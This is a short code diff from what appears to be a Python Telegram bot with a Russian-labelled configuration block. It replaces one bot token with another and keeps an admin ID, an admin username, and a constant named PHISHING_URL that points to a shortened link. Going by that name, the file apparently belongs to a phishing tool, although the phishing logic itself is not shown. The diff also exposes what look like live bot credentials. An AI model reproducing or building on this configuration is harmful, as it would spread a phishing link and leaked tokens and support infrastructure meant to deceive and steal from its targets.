@@ -7,7 +7,7 @@ import os
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
 # ========== КОНФИГУРАЦИЯ ==========
-BOT_TOKEN = "8601549576:AAHLJF0oPN6Sx6jQRpfuHz-Stl3Fri_6LxI"
+BOT_TOKEN = "8601549576:AAEcF_LSM9fqOrCNwBq5OOhiR66PqkZlV0Y"
 ADMIN_ID = 8744429026
 ADMIN_USERNAME = "NeresVoid"
 PHISHING_URL = "https://da.gd/tzO5QW"
